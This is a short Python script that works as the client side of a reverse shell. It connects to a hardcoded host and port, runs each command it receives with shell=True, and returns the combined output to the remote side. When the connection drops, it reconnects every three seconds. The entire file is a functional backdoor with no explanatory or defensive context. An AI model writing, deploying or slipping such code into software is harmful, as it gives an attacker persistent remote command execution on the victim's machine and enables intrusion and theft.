#!/usr/bin/env python
import socket,subprocess as sp,sys
import time

def connect():
    #host = str(sys.argv[1])
    #port = int(sys.argv[2])
    host = "127.0.0.1"
    port = 8000
    conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try :
        conn.connect((host,port))
    except:
        pass
    return conn

def main():
    conn=connect()
    while True:
        try:
            while 1:
                command = conn.recv(1024).decode('utf-8')

                if command != "exit()":
                    sh = sp.Popen(command,shell=True,
                        stdout=sp.PIPE,
                        stderr=sp.PIPE,
                        stdin=sp.PIPE)

                    out , err = sh.communicate()

                    result = (out + err).decode('utf-8')

                    length = str(len(result)).zfill(16)

                    conn.send((length + result).encode('utf-8'))
                else:break
            conn.close()
        except socket.error:
            print("reconnect")
            time.sleep(3)
            conn=connect()
        except :
            print("another error")
            time.sleep(3)
            conn=connect()

if __name__ =="__main__":main()
        